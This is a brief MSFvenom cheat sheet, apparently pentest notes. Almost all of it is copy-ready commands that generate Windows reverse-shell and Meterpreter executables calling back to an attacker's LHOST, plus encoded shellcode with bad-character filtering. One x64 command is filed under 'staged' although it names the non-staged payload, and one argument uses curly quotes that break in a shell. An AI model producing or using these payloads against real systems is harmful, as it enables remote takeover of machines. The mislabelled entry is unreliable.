# MSFvenom

### Commands

```text
-p    Selects the payload
-l    List modules (payloads, encoders, nops, all)
-n    Prepend a nop sled to the payload
-f    Output format
-e    Encoder
-s    Maximum space for the payload
-a    Architecture
-b    Bad characters
--platform    Platform
```

#### Windows staged payloads

```text
msfvenom -p windows/shell/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

#### Windows non-staged payloads

```text
msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x86.exe
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell-x64.exe
```

#### Meterpreter payloads

```text
Msfvenom -p windows/meterpreter/reverse_https LHOST=10.11.0.5 LPORT=443 -f exe -o met_https_reverse.exe
```

Using ExitThread instead of ExitProcess can help prevent crashing the program

```text
Msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.4 LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b “\x00\x0a\x0d”
```



